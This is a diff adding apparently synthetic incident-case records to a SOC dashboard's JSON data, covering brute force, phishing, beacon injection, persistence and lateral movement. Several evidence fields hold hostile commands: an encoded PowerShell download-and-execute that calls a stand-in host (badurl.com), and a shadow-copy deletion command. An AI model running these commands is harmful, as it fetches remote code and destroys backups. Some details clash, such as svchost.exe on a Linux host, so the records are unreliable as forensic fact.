@@ -750,5 +750,403 @@
         "updatedAt": "2026-05-31T14:53:15.308Z"
       }
     ]
+  },
+  {
+    "_id": "nt9qzni",
+    "title": "[AUTO-CONTAINED] Incident Case: Brute Force SSH Attack",
+    "severity": "HIGH",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:53:30.322Z",
+    "updatedAt": "2026-05-31T14:53:30.322Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:53:30.322Z",
+        "activity": "Intrusion Alert Fired: Brute Force SSH Attack",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:53:30.322Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "xttnf0z",
+        "timestamp": "2026-05-31T14:53:30.308Z",
+        "severity": "HIGH",
+        "title": "Brute Force SSH Attack",
+        "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+        "category": "Credential Access",
+        "host": "LINUX-SOC-DB-02",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "service": "sshd",
+          "failures": 42,
+          "ip": "185.220.101.5",
+          "mitreTactic": "Credential Access",
+          "mitreTechnique": "T1110 - Brute Force"
+        },
+        "createdAt": "2026-05-31T14:53:30.309Z",
+        "updatedAt": "2026-05-31T14:53:30.309Z"
+      }
+    ]
+  },
+  {
+    "_id": "1h494wg",
+    "title": "[AUTO-CONTAINED] Incident Case: Active Directory Shadow Copy Access",
+    "severity": "CRITICAL",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:53:45.325Z",
+    "updatedAt": "2026-05-31T14:53:45.325Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:53:45.325Z",
+        "activity": "Intrusion Alert Fired: Active Directory Shadow Copy Access",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:53:45.325Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "c35w9fj",
+        "timestamp": "2026-05-31T14:53:45.308Z",
+        "severity": "CRITICAL",
+        "title": "Active Directory Shadow Copy Access",
+        "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+        "category": "Credential Dumping",
+        "host": "WIN-SOC-DEV-05",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "command": "vssadmin delete shadows /all /quiet",
+          "process": "cmd.exe",
+          "mitreTactic": "Credential Access",
+          "mitreTechnique": "T1003 - OS Credential Dumping"
+        },
+        "createdAt": "2026-05-31T14:53:45.310Z",
+        "updatedAt": "2026-05-31T14:53:45.310Z"
+      }
+    ]
+  },
+  {
+    "_id": "k4zmybx",
+    "title": "[AUTO-CONTAINED] Incident Case: Malicious EML Attachment Opened",
+    "severity": "CRITICAL",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:54:00.329Z",
+    "updatedAt": "2026-05-31T14:54:00.329Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:54:00.329Z",
+        "activity": "Intrusion Alert Fired: Malicious EML Attachment Opened",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:54:00.329Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "q3sfx9q",
+        "timestamp": "2026-05-31T14:54:00.309Z",
+        "severity": "CRITICAL",
+        "title": "Malicious EML Attachment Opened",
+        "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+        "category": "Phishing",
+        "host": "WIN-SOC-AD-02",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "parent": "outlook.exe",
+          "process": "powershell.exe",
+          "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+          "mitreTactic": "Initial Access",
+          "mitreTechnique": "T1566 - Phishing"
+        },
+        "createdAt": "2026-05-31T14:54:00.311Z",
+        "updatedAt": "2026-05-31T14:54:00.311Z"
+      }
+    ]
+  },
+  {
+    "_id": "pu47iku",
+    "title": "[AUTO-CONTAINED] Incident Case: Cobalt Strike Beacon Injected",
+    "severity": "CRITICAL",
+    "status": "CONTAINED",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:54:15.333Z",
+    "updatedAt": "2026-05-31T14:54:15.333Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:54:15.333Z",
+        "activity": "Intrusion Alert Fired: Cobalt Strike Beacon Injected",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:54:15.333Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "fiw9j4a",
+        "timestamp": "2026-05-31T14:54:15.310Z",
+        "severity": "CRITICAL",
+        "title": "Cobalt Strike Beacon Injected",
+        "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+        "category": "Malware",
+        "host": "LINUX-WEB-APP-01",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "process": "svchost.exe",
+          "parent": "powershell.exe",
+          "integrityLevel": "SYSTEM",
+          "mitreTactic": "Execution",
+          "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+        },
+        "createdAt": "2026-05-31T14:54:15.312Z",
+        "updatedAt": "2026-05-31T14:54:15.312Z"
+      }
+    ]
+  },
+  {
+    "_id": "iw26x91",
+    "title": "[AUTO-CONTAINED] Incident Case: Persistence Registry Mechanism Configured",
+    "severity": "HIGH",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:54:30.326Z",
+    "updatedAt": "2026-05-31T14:54:30.326Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:54:30.326Z",
+        "activity": "Intrusion Alert Fired: Persistence Registry Mechanism Configured",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:54:30.326Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "nt3owpm",
+        "timestamp": "2026-05-31T14:54:30.312Z",
+        "severity": "HIGH",
+        "title": "Persistence Registry Mechanism Configured",
+        "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+        "category": "Persistence",
+        "host": "WIN-SOC-AD-02",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+          "value": "C:\\Users\\Public\\updater.exe",
+          "mitreTactic": "Persistence",
+          "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+        },
+        "createdAt": "2026-05-31T14:54:30.313Z",
+        "updatedAt": "2026-05-31T14:54:30.313Z"
+      }
+    ]
+  },
+  {
+    "_id": "vbfkj9v",
+    "title": "[AUTO-CONTAINED] Incident Case: Malicious EML Attachment Opened",
+    "severity": "CRITICAL",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:54:45.329Z",
+    "updatedAt": "2026-05-31T14:54:45.329Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:54:45.329Z",
+        "activity": "Intrusion Alert Fired: Malicious EML Attachment Opened",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:54:45.329Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "d40j9kt",
+        "timestamp": "2026-05-31T14:54:45.313Z",
+        "severity": "CRITICAL",
+        "title": "Malicious EML Attachment Opened",
+        "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+        "category": "Phishing",
+        "host": "WIN-SOC-AD-02",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "parent": "outlook.exe",
+          "process": "powershell.exe",
+          "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+          "mitreTactic": "Initial Access",
+          "mitreTechnique": "T1566 - Phishing"
+        },
+        "createdAt": "2026-05-31T14:54:45.314Z",
+        "updatedAt": "2026-05-31T14:54:45.314Z"
+      }
+    ]
+  },
+  {
+    "_id": "xbmm695",
+    "title": "[AUTO-CONTAINED] Incident Case: Lateral Movement Attempted",
+    "severity": "HIGH",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:55:00.332Z",
+    "updatedAt": "2026-05-31T14:55:00.332Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:55:00.332Z",
+        "activity": "Intrusion Alert Fired: Lateral Movement Attempted",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:55:00.332Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "zedq2ab",
+        "timestamp": "2026-05-31T14:55:00.313Z",
+        "severity": "HIGH",
+        "title": "Lateral Movement Attempted",
+        "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+        "category": "Lateral Movement",
+        "host": "WIN-SOC-AD-02",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "protocol": "WMI",
+          "src": "WIN-SOC-DEV-05",
+          "dest": "WIN-SOC-PROD-01",
+          "mitreTactic": "Lateral Movement",
+          "mitreTechnique": "T1021 - Remote Services"
+        },
+        "createdAt": "2026-05-31T14:55:00.315Z",
+        "updatedAt": "2026-05-31T14:55:00.315Z"
+      }
+    ]
+  },
+  {
+    "_id": "v9yr5p4",
+    "title": "[AUTO-CONTAINED] Incident Case: Malicious EML Attachment Opened",
+    "severity": "CRITICAL",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:55:15.328Z",
+    "updatedAt": "2026-05-31T14:55:15.328Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:55:15.328Z",
+        "activity": "Intrusion Alert Fired: Malicious EML Attachment Opened",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:55:15.328Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "lgvrxj9",
+        "timestamp": "2026-05-31T14:55:15.314Z",
+        "severity": "CRITICAL",
+        "title": "Malicious EML Attachment Opened",
+        "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+        "category": "Phishing",
+        "host": "WIN-SOC-DEV-05",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "parent": "outlook.exe",
+          "process": "powershell.exe",
+          "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+          "mitreTactic": "Initial Access",
+          "mitreTechnique": "T1566 - Phishing"
+        },
+        "createdAt": "2026-05-31T14:55:15.315Z",
+        "updatedAt": "2026-05-31T14:55:15.315Z"
+      }
+    ]
   }
 ]
